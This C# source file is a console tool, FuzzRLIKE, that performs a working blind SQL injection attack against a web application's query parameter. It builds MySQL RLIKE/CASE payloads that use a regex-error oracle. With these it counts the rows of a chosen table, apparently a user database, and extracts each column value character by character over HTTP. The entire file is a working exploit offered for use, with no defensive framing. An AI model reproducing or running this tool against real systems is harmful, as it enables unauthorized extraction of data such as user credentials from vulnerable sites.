using System;
using System.IO;
using System.Collections.Generic;
using System.Net;
using System.Text;

namespace FuzzRLIKE
{
    class Program
    {
        private static string url = string.Empty;
        private static string dbName = string.Empty;
        private static string[] columns;

        static void Main(string[] args)
        {
            try
            {
                try
                {
                    url = string.Format("{0}&{1}=", args[0], args[1]);
                    dbName = args[2];
                    columns = args[3].Split(',');
                }
                catch (Exception)
                {
                    throw new Exception(string.Format("Usage: {0} URL Method Table Columns\n",
                        System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName));
                }

                int countLength = 1;
                for (; ; countLength++)
                {
                    string getCountLength = getPayload(
                        string.Format("(SELECT LENGTH(IFNULL(CAST(COUNT(*) AS CHAR), 0x20)) FROM {0}) = {1}",
                        dbName, countLength));

                    string response = MakeRequest(url, getCountLength);

                    if (isErrorWord(response))
                        break;
                }

                List<byte> countBytes = new List<byte>();
                for (int i = 1; i <= countLength; i++)
                {
                    for (int c = 48; c <= 58; c++)
                    {
                        string getCount = getPayload(
                            string.Format("ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM {0}), {1}, 1)) = {2}",
                            dbName, i, c));

                        string response = MakeRequest(url, getCount);

                        if (isErrorWord(response))
                        {
                            countBytes.Add((byte)c);
                            break;
                        }
                    }
                }

                int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
                Console.WriteLine(string.Format("There are {0} rows in the userdb table", count));

                for (int row = 0; row < count; row++)
                {
                    foreach (string column in columns)
                    {
                        //Console.Write("Getting length of query value...  ");
                        int valLength = GetLength(row, column);
                        //Console.WriteLine(valLength);

                        Console.Write(string.Format("Getting {0}",column.PadRight(15,' ')));
                        string value = GetValue(row, column, valLength);
                        Console.WriteLine(value);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        private static string MakeRequest(string url,string payload)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);

            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            return response;
        }

        private static int GetLength(int row, string column)
        {
            int countLength = 0;

            for (; ; countLength++)
            {
                string getCountLength = getPayload(
                    string.Format("(SELECT LENGTH(IFNULL(CAST(CHAR_LENGTH({0}) AS CHAR),0x20)) FROM {1} ORDER BY {2} LIMIT {3},1) = {4}",
                    column, dbName, columns[0], row, countLength));

                string response = MakeRequest(url, getCountLength);

                if (isErrorWord(response))
                    break;
            }

            List<byte> countBytes = new List<byte>();
            for (int i = 0; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    string getLength = getPayload(
                        string.Format("ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH({0}) AS CHAR),0x20) FROM {1} ORDER BY {2} LIMIT {3},1),{4},1))={5}",
                        column, dbName, columns[0], row, i, c));

                    string response = MakeRequest(url, getLength);

                    if (isErrorWord(response))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }

            if (countBytes.Count > 0)
                return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            else
                return 0;
        }

        private static string GetValue(int row, string column, int length)
        {
            List<byte> valBytes = new List<byte>();
            for (int i = 0; i <= length; i++)
            {
                for (int c = 32; c <= 126; c++)
                {
                    string getChar = getPayload(
                        string.Format("ORD(MID((SELECT IFNULL(CAST({0} AS CHAR),0x20) FROM {1} ORDER BY {2} LIMIT {3},1),{4},1)) = {5}",
                        column, dbName, columns[0], row, i, c));

                    string response = MakeRequest(url, getChar);

                    if (isErrorWord(response))
                    {
                        valBytes.Add((byte)c);
                        break;
                    }
                }
            }

            return Encoding.ASCII.GetString(valBytes.ToArray());
        }

        private static string getPayload(string input)
        {
            string ans = string.Format("(fdsa' RLIKE (SELECT (CASE WHEN ({0}) THEN 0x28 ELSE 0x41 END)) AND 'asd'='asd)",
                input);

            return ans;
        }

        private static bool isErrorWord(string response)
        {
            if (response.Contains("You have an error in your SQL syntax"))
                throw new Exception(response);

            return response.Contains("parentheses not balanced");
        }
    }
}
